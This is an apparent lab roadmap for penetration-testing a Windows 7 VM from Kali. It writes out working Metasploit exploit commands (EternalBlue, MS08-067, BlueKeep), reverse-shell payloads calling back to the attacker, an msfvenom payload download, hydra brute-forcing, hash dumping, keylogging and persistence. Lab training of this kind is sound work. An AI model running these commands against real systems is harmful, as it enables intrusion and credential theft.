# Windows 7 VM — Vulnerability Assessment & Penetration Test Roadmap
**Lab:** Kali Linux (attacker) + Windows 7 (target) on VirtualBox, same Host-Only/Internal network
**Scope:** Authorized lab testing only — both VMs owned by you
**Note:** Windows 7 is EOL (no more patches since Jan 2020) and ships with SMBv1 enabled by default on most ISOs — this makes it an excellent and realistic target for classic exploitation practice.

---

## 0. Project Setup

### Network Config
- [ ] Set both VMs to **Host-Only Adapter** or **Internal Network**
- [ ] Kali: `ip a` → note IP (e.g. 192.168.56.101)
- [ ] Windows 7: `ipconfig` → note IP (e.g. 192.168.56.103)
- [ ] Test: `ping <win7_ip>` from Kali
- [ ] On Windows 7, confirm Windows Firewall state (Control Panel → Windows Firewall) — note if it's on/off as a finding

### Snapshot Checkpoints
- [ ] Snapshot Windows 7 clean baseline before testing
- [ ] Snapshot after each phase if repeating

### Folder Structure
```
~/engagements/win7-lab/
├── 01-recon/
├── 02-scanning/
├── 03-vuln-analysis/
├── 04-exploitation/
├── 05-post-exploitation/
├── 06-loot/
├── screenshots/
└── report.md
```
`mkdir -p ~/engagements/win7-lab/{01-recon,02-scanning,03-vuln-analysis,04-exploitation,05-post-exploitation,06-loot,screenshots}`

---

## Phase 1 — Reconnaissance

| Task | Command |
|---|---|
| Ping sweep | `nmap -sn 192.168.56.0/24` |
| Confirm host up | `ping -c 4 <win7_ip>` |
| ARP check | `arp -a` |

---

## Phase 2 — Scanning & Enumeration

| Task | Command |
|---|---|
| Full TCP port scan | `nmap -p- -T4 <win7_ip> -oN 02-scanning/full-tcp.txt` |
| Service/version detection | `nmap -sV -sC -p <ports> <win7_ip> -oN 02-scanning/service-scan.txt` |
| OS detection | `nmap -O <win7_ip>` |
| SMB OS discovery | `nmap --script smb-os-discovery -p445 <win7_ip>` |
| SMB share/user enum | `nmap --script smb-enum-shares,smb-enum-users -p445 <win7_ip>` |
| **MS17-010 (EternalBlue) check** | `nmap --script smb-vuln-ms17-010 -p445 <win7_ip>` |
| MS08-067 check (older RPC vuln, still worth checking) | `nmap --script smb-vuln-ms08-067 -p445 <win7_ip>` |
| Null session enum | `enum4linux -a <win7_ip>` |
| RPC enum | `rpcclient -U "" <win7_ip>` |
| Share listing | `smbclient -L //<win7_ip>/ -N` |
| SMB protocol version check | `nmap --script smb-protocols -p445 <win7_ip>` |

**Checklist:**
- [ ] Confirm SMBv1 is enabled (`smb-protocols` output)
- [ ] Note exact Windows 7 build/Service Pack (affects which CVEs apply)
- [ ] Open ports: 135, 139, 445, 3389 commonly present by default

---

## Phase 3 — Vulnerability Analysis

| Task | Command |
|---|---|
| Nmap vuln script sweep | `nmap --script vuln <win7_ip>` |
| Searchsploit lookup | `searchsploit windows 7` |
| Update exploit-db | `searchsploit -u` |
| Metasploit module search | `msfconsole -q -x "search type:exploit platform:windows ms17-010"` |

**Known CVEs very likely to apply to an unpatched Win7 lab image:**
- [ ] **MS17-010 / EternalBlue** (CVE-2017-0144) — SMBv1 remote code execution
- [ ] **MS08-067** — Server Service RPC vulnerability (older, Win7 RTM/early SP)
- [ ] **CVE-2019-0708 (BlueKeep)** — RDP, if RDP is enabled and unpatched
- [ ] Weak/default local account passwords
- [ ] Autorun/UAC default settings (lower than Win10 defaults)

---

## Phase 4 — Exploitation

### A. EternalBlue (MS17-010) — most reliable on default Win7
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <win7_ip>
set LHOST <kali_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```
If 32-bit Win7: use `windows/meterpreter/reverse_tcp` instead of `windows/x64/...`

### B. MS08-067 (if applicable build)
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <win7_ip>
set LHOST <kali_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

### C. BlueKeep (CVE-2019-0708) — if RDP enabled, use with caution (can crash target)
```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <win7_ip>
set LHOST <kali_ip>
set target <correct build target index — check 'show targets'>
run
```

### D. Payload-delivery method (works regardless of CVE patch state)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o payload.exe
python3 -m http.server 8000
```
Download `payload.exe` via browser on the Win7 VM, then catch it:
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <kali_ip>; set LPORT 4444; run"
```

### E. Credential-based access (if you set a known weak password)
| Task | Command |
|---|---|
| Validate creds over SMB | `crackmapexec smb <win7_ip> -u <user> -p <pass>` |
| PSExec-style shell | `psexec.py <user>:<pass>@<win7_ip>` |
| RDP brute (your own wordlist, throttled) | `hydra -L users.txt -P pass.txt rdp://<win7_ip>` |

---

## Phase 5 — Post-Exploitation

| Task | Command (Meterpreter) |
|---|---|
| System info | `sysinfo` |
| Current user/privs | `getuid` |
| Elevate to SYSTEM | `getsystem` |
| List processes | `ps` |
| Migrate process | `migrate <pid>` |
| Dump hashes | `hashdump` |
| Screenshot | `screenshot` |
| Keylogging | `keyscan_start` / `keyscan_dump` |
| Local priv-esc enum | Upload and run `winPEAS.exe` or `Sherlock.ps1` |
| Pivot/network discovery | `run post/windows/gather/enum_logged_on_users` |
| Persistence (lab only — remove after) | `run persistence -X -i 5 -p 4444 -r <kali_ip>` |

- [ ] Record privilege level achieved
- [ ] Clean up persistence after test cycle

---

## Phase 6 — Reporting

Same structure as the Windows 10 report — reuse this template:
```markdown
# Penetration Test Report — Windows 7 Lab VM
## Executive Summary
## Scope & Methodology
## Findings
  ### Finding: MS17-010 EternalBlue — Severity: Critical
  - Description / Evidence / Impact / Remediation (patch, disable SMBv1)
## Attack Narrative (timeline)
## Tools Used
## Conclusion & Recommendations
```

---

## Notion Database Suggestion
Columns: `Phase | Task | Command | Status | Finding | Screenshot`
Group rows by phase (1–6 above), check off as completed.

---

## Reference Tool List
- **nmap** — scanning, vuln scripts
- **Metasploit (msfconsole/msfvenom)** — exploitation
- **impacket** (psexec.py, secretsdump.py, wmiexec.py) — SMB/auth attacks
- **crackmapexec** — credential validation/spraying
- **enum4linux** — SMB enumeration
- **searchsploit** — exploit-db lookup
- **winPEAS / Sherlock.ps1** — privilege escalation enumeration
- **Wireshark** — traffic analysis between VMs

---

## Safety Reminders
- Keep VMs isolated (Host-Only/Internal network only)
- Only target VMs you own
- BlueKeep exploits can BSOD the target — snapshot before attempting
- Re-snapshot Win7 to baseline between test cycles
